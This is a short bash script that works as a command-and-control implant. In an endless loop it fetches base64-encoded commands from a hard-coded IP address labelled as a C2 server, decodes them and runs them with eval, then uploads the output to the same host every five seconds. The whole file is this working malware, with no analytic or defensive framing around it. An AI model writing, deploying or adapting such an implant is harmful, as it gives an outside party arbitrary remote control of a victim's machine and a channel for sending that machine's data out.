#!/bin/bash

while true; do
  # Fetch base64-encoded command from C2 server
  encoded_cmd=$(curl -fsSL http://54.95.251.88/getcmd)

  # Decode and execute the command
  decoded_cmd=$(echo "$encoded_cmd" | base64 -d)
  eval "$decoded_cmd" 2>&1 | tee /tmp/cmd_output

  # Upload results
  curl -fsSL -X POST -d "@/tmp/cmd_output" http://54.95.251.88/postresult

  sleep 5
done